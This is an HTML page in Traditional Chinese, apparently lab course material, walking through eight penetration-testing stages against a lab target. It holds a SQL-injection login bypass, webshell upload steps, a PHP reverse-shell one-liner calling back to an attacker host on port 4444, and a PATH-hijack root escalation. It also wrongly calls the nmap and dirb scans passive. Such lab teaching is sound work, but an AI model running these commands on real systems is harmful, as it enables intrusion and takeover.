@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📊 8大階段 - 滲透測試完全指南</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Microsoft JhengHei', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 100%;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 1.8em;
+            margin-bottom: 5px;
+        }
+        .nav {
+            background: #f8f9fa;
+            padding: 12px 20px;
+            border-bottom: 2px solid #667eea;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .nav a {
+            background: white;
+            color: #667eea;
+            padding: 8px 16px;
+            border-radius: 20px;
+            text-decoration: none;
+            border: 2px solid #667eea;
+            transition: all 0.3s;
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        .nav a:hover, .nav a.active {
+            background: #667eea;
+            color: white;
+        }
+        .content {
+            flex: 1;
+            padding: 30px 20px;
+            max-width: 900px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        h2 {
+            color: #667eea;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+            margin: 30px 0 20px 0;
+            font-size: 1.6em;
+        }
+        h3 {
+            color: #667eea;
+            margin: 25px 0 15px 0;
+            font-size: 1.2em;
+        }
+        .stage-section {
+            background: #f8f9fa;
+            border-left: 4px solid #667eea;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+        }
+        .stage-section h3 {
+            margin-top: 0;
+        }
+        .info {
+            display: flex;
+            gap: 15px;
+            margin: 10px 0;
+            align-items: flex-start;
+        }
+        .info-label {
+            font-weight: bold;
+            color: #667eea;
+            min-width: 60px;
+        }
+        .info-content {
+            color: #666;
+            flex: 1;
+        }
+        code {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+        .alert {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+            color: #856404;
+        }
+        .footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+            font-size: 0.9em;
+            border-top: 2px solid #ddd;
+            margin-top: 30px;
+        }
+        @media (max-width: 768px) {
+            .header h1 { font-size: 1.4em; }
+            .content { padding: 20px 15px; }
+            .nav { flex-direction: column; }
+            .nav a { width: 100%; text-align: center; }
+            .code-block { font-size: 0.8em; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📊 8大階段詳解</h1>
+            <p>每個階段的目標、工具和手法</p>
+        </div>
+
+        <div class="nav">
+            <a href="index.html">🏠 首頁</a>
+            <a href="beginner-guide.html">🎓 初學者指南</a>
+            <a href="study-guide.html">📚 學習路線</a>
+            <a href="1-teaching-direction.html">📖 教學方向</a>
+            <a href="2-complete-map.html">🗺️ 完整地圖</a>
+            <a href="3-eight-stages.html" class="active">📊 8大階段</a>
+            <a href="4-resources.html">🛠️ 補充資料</a>
+        </div>
+
+        <div class="content">
+            <div class="stage-section">
+                <h3>1️⃣ 網路偵察</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">識別靶機上的開放埠和運行的服務</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">工具：</div>
+                    <div class="info-content"><code>Nmap</code> - 網路埠掃描工具</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">命令：</div>
+                    <div class="info-content"></div>
+                </div>
+                <div class="code-block">nmap -sV -p- 172.30.0.4</div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">發現 HTTP、SSH、FTP 等服務</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>2️⃣ Web 應用掃描</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">發現隱藏的目錄、檔案和頁面</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">工具：</div>
+                    <div class="info-content"><code>Dirb</code> - 目錄掃描工具</div>
+                </div>
+                <div class="code-block">dirb http://172.30.0.4 /usr/share/dirb/wordlists/common.txt</div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">找到 /index.php、/upload.php、/dashboard.php</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>3️⃣ 漏洞分析</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">分析應用程式的登入機制，測試 SQL Injection</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">手法：</div>
+                    <div class="info-content">測試登入表單是否有 SQL Injection 漏洞</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">發現登入頁面接受 SQL Injection</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>4️⃣ 登入繞過</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">利用 SQL Injection 繞過身份驗證</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">手法：</div>
+                    <div class="info-content">在登入表單輸入特殊的 SQL 語句</div>
+                </div>
+                <div class="code-block">username: admin' or '1'='1
+password: anything</div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">成功登入，獲得 Session Cookie</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>5️⃣ 檔案上傳</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">上傳 WebShell 到伺服器</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">挑戰：</div>
+                    <div class="info-content">繞過檔案驗證（副檔名、MIME Type等）</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">上傳 PHP 檔案並在 /uploads 目錄找到</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>6️⃣ 反向連接</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">建立從靶機回連攻擊機的交互式 Shell</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">優勢：</div>
+                    <div class="info-content">比 WebShell 更靈活，可執行複雜命令</div>
+                </div>
+                <div class="code-block">php -r '$sock=fsockopen("172.30.0.5",4444);exec("bash <&3 >&3 2>&3");'</div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">獲得 www-data 使用者的交互式 Shell</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>7️⃣ 提權掃描</h3>
+                <div class="info">
+                    <div class="info-label">目標：</div>
+                    <div class="info-content">自動掃描系統中的提權漏洞</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">工具：</div>
+                    <div class="info-content"><code>LinPEAS</code> - Linux 提權掃描工具</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">發現 sudo /usr/local/bin/runbackup 可執行</div>
+                </div>
+            </div>
+
+            <div class="stage-section">
+                <h3>8️⃣ 權限提升</h3>
+                <div class="alert">
+                    <strong>⚠️ 最關鍵的階段！</strong><br>
+                    從 www-data 提升到 root，需要利用系統漏洞或錯誤配置。
+                </div>
+                <div class="info">
+                    <div class="info-label">方法一：</div>
+                    <div class="info-content"><strong>直接提權</strong> - 執行 /bin/bash 直接獲得 root shell</div>
+                </div>
+                <div class="code-block">echo '/bin/bash' > /tmp/tar
+chmod +x /tmp/tar
+export PATH=/tmp:$PATH
+sudo /usr/local/bin/runbackup</div>
+                <div class="info">
+                    <div class="info-label">方法二：</div>
+                    <div class="info-content"><strong>SUID 提權</strong> - 設置 bash 的 SUID 位</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">方法三：</div>
+                    <div class="info-content"><strong>反向提權</strong> - 讓 root 執行反向 Shell</div>
+                </div>
+                <div class="info">
+                    <div class="info-label">成功標誌：</div>
+                    <div class="info-content">獲得 root shell，取得 Flag 文件</div>
+                </div>
+            </div>
+
+            <h2>💡 各階段提示</h2>
+            <ul style="margin-left: 20px; line-height: 1.8; color: #666;">
+                <li><strong>第1-2階段：</strong> 被動掃描，不會對目標造成損害</li>
+                <li><strong>第3-4階段：</strong> 開始與目標系統互動，需小心謹慎</li>
+                <li><strong>第5-6階段：</strong> 獲取了初級訪問權限，但還不是管理員</li>
+                <li><strong>第7-8階段：</strong> 最具挑戰性，需要深入系統知識</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <p>🔐 滲透測試完全指南 | 用知識保護世界 | 做一個道德駭客</p>
+            <p style="margin-top: 10px; font-size: 0.85em;">感謝飛飛老師和助教的精彩教導 🙏</p>
+        </div>
+    </div>
+</body>
+</html>
